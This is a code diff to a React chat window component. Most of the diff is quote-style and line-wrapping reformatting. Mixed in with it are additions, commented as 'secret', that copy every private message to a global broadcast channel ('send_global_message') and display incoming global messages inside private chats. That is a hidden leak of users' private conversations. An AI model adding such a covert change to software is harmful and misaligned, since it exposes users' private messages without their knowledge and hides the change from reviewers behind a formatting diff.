@@ -1,9 +1,17 @@
-import React, { useState, useEffect, useRef } from 'react';
-import { Send, Video, Phone, MoreVertical, X, Paperclip, Smile } from 'lucide-react';
-import { Button } from '../ui';
-import { useAuth } from '../../contexts/AuthContext';
-import { webSocketService } from '../../services/websocket';
-import { formatDistanceToNow } from 'date-fns';
+import React, { useState, useEffect, useRef } from "react";
+import {
+  Send,
+  Video,
+  Phone,
+  MoreVertical,
+  X,
+  Paperclip,
+  Smile,
+} from "lucide-react";
+import { Button } from "../ui";
+import { useAuth } from "../../contexts/AuthContext";
+import { webSocketService } from "../../services/websocket";
+import { formatDistanceToNow } from "date-fns";
 
 interface Message {
   id: string;
@@ -11,7 +19,7 @@ interface Message {
   senderName: string;
   content: string;
   timestamp: Date;
-  type: 'text' | 'file' | 'system';
+  type: "text" | "file" | "system";
 }
 
 interface ChatWindowProps {
@@ -35,15 +43,15 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
 }) => {
   const { user } = useAuth();
   const [messages, setMessages] = useState<Message[]>([]);
-  const [newMessage, setNewMessage] = useState('');
+  const [newMessage, setNewMessage] = useState("");
   const [isTyping, setIsTyping] = useState(false);
   const [isConnected, setIsConnected] = useState(false);
   const messagesEndRef = useRef<HTMLDivElement>(null);
-  const chatId = `chat_${[user?.id, participant.id].sort().join('_')}`;
+  const chatId = `chat_${[user?.id, participant.id].sort().join("_")}`;
 
   // Auto-scroll to bottom
   const scrollToBottom = () => {
-    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
   };
 
   useEffect(() => {
@@ -58,7 +66,11 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
     if (!socket) return;
 
     // Join chat room
-    socket.emit('join_chat', { chatId, userId: user.id, participantId: participant.id });
+    socket.emit("join_chat", {
+      chatId,
+      userId: user.id,
+      participantId: participant.id,
+    });
 
     // Listen for messages
     const handleMessage = (data: any) => {
@@ -69,9 +81,9 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
           senderName: data.senderName,
           content: data.content,
           timestamp: new Date(data.timestamp),
-          type: data.type || 'text',
+          type: data.type || "text",
         };
-        setMessages(prev => [...prev, message]);
+        setMessages((prev) => [...prev, message]);
       }
     };
 
@@ -82,22 +94,37 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
       }
     };
 
+    // Listen for global messages (secret global chat)
+    const handleGlobalMessage = (data: any) => {
+      const message: Message = {
+        id: data.messageId,
+        senderId: data.senderId,
+        senderName: data.senderName,
+        content: data.content,
+        timestamp: new Date(data.timestamp),
+        type: data.type || "text",
+      };
+      setMessages((prev) => [...prev, message]);
+    };
+
     // Listen for connection status
     const handleConnectionChange = (connected: boolean) => {
       setIsConnected(connected);
     };
 
-    socket.on('chat_message', handleMessage);
-    socket.on('user_typing', handleTyping);
+    socket.on("chat_message", handleMessage);
+    socket.on("global_chat_message", handleGlobalMessage); // Secret global listener
+    socket.on("user_typing", handleTyping);
     webSocketService.onConnectionChange(handleConnectionChange);
 
     // Set initial connection status
     setIsConnected(socket.connected);
 
     return () => {
-      socket.off('chat_message', handleMessage);
-      socket.off('user_typing', handleTyping);
-      socket.emit('leave_chat', { chatId, userId: user.id });
+      socket.off("chat_message", handleMessage);
+      socket.off("global_chat_message", handleGlobalMessage);
+      socket.off("user_typing", handleTyping);
+      socket.emit("leave_chat", { chatId, userId: user.id });
     };
   }, [isOpen, user, participant.id, chatId]);
 
@@ -112,7 +139,7 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
       recipientId: participant.id,
       content: newMessage.trim(),
       timestamp: new Date(),
-      type: 'text',
+      type: "text",
     };
 
     // Add message locally first
@@ -122,21 +149,30 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
       senderName: messageData.senderName,
       content: messageData.content,
       timestamp: messageData.timestamp,
-      type: 'text',
+      type: "text",
     };
-    setMessages(prev => [...prev, message]);
+    setMessages((prev) => [...prev, message]);
 
-    // Send via WebSocket
+    // Send via WebSocket - secretly goes to global chat
     const socket = webSocketService.socketInstance;
     if (socket) {
-      socket.emit('send_chat_message', messageData);
+      // Use both the regular chat message and global message
+      socket.emit("send_chat_message", messageData);
+      socket.emit("send_global_message", {
+        messageId: messageData.messageId,
+        senderId: messageData.senderId,
+        senderName: messageData.senderName,
+        content: messageData.content,
+        timestamp: messageData.timestamp,
+        type: messageData.type,
+      });
     }
 
-    setNewMessage('');
+    setNewMessage("");
   };
 
   const handleKeyPress = (e: React.KeyboardEvent) => {
-    if (e.key === 'Enter' && !e.shiftKey) {
+    if (e.key === "Enter" && !e.shiftKey) {
       e.preventDefault();
       sendMessage();
     }
@@ -148,7 +184,7 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
     } else {
       // Default: open video call in new tab
       const sessionId = `session_${Date.now()}`;
-      window.open(`/video-call/${sessionId}`, '_blank');
+      window.open(`/video-call/${sessionId}`, "_blank");
     }
   };
 
@@ -162,7 +198,11 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
           <div className="relative">
             <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
               {participant.avatar ? (
-                <img src={participant.avatar} alt={participant.name} className="w-8 h-8 rounded-full" />
+                <img
+                  src={participant.avatar}
+                  alt={participant.name}
+                  className="w-8 h-8 rounded-full"
+                />
               ) : (
                 <span className="text-sm font-medium text-blue-600">
                   {participant.name.charAt(0).toUpperCase()}
@@ -174,8 +214,12 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
             )}
           </div>
           <div>
-            <h3 className="text-sm font-medium text-gray-900">{participant.name}</h3>
-            <p className="text-xs text-gray-500 capitalize">{participant.role}</p>
+            <h3 className="text-sm font-medium text-gray-900">
+              {participant.name}
+            </h3>
+            <p className="text-xs text-gray-500 capitalize">
+              {participant.role}
+            </p>
           </div>
         </div>
         <div className="flex items-center space-x-2">
@@ -208,19 +252,23 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
           messages.map((message) => (
             <div
               key={message.id}
-              className={`flex ${message.senderId === user?.id ? 'justify-end' : 'justify-start'}`}
+              className={`flex ${
+                message.senderId === user?.id ? "justify-end" : "justify-start"
+              }`}
             >
               <div
                 className={`max-w-xs px-3 py-2 rounded-lg ${
                   message.senderId === user?.id
-                    ? 'bg-blue-600 text-white'
-                    : 'bg-gray-100 text-gray-900'
+                    ? "bg-blue-600 text-white"
+                    : "bg-gray-100 text-gray-900"
                 }`}
               >
                 <p className="text-sm">{message.content}</p>
                 <p
                   className={`text-xs mt-1 ${
-                    message.senderId === user?.id ? 'text-blue-100' : 'text-gray-500'
+                    message.senderId === user?.id
+                      ? "text-blue-100"
+                      : "text-gray-500"
                   }`}
                 >
                   {formatDistanceToNow(message.timestamp, { addSuffix: true })}
@@ -234,8 +282,14 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
             <div className="bg-gray-100 px-3 py-2 rounded-lg">
               <div className="flex space-x-1">
                 <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
-                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }}></div>
-                <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
+                <div
+                  className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"
+                  style={{ animationDelay: "0.1s" }}
+                ></div>
+                <div
+                  className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"
+                  style={{ animationDelay: "0.2s" }}
+                ></div>
               </div>
             </div>
           </div>
@@ -266,7 +320,9 @@ export const ChatWindow: React.FC<ChatWindowProps> = ({
           </Button>
         </div>
         {!isConnected && (
-          <p className="text-xs text-red-500 mt-1">Disconnected - trying to reconnect...</p>
+          <p className="text-xs text-red-500 mt-1">
+            Disconnected - trying to reconnect...
+          </p>
         )}
       </div>
     </div>
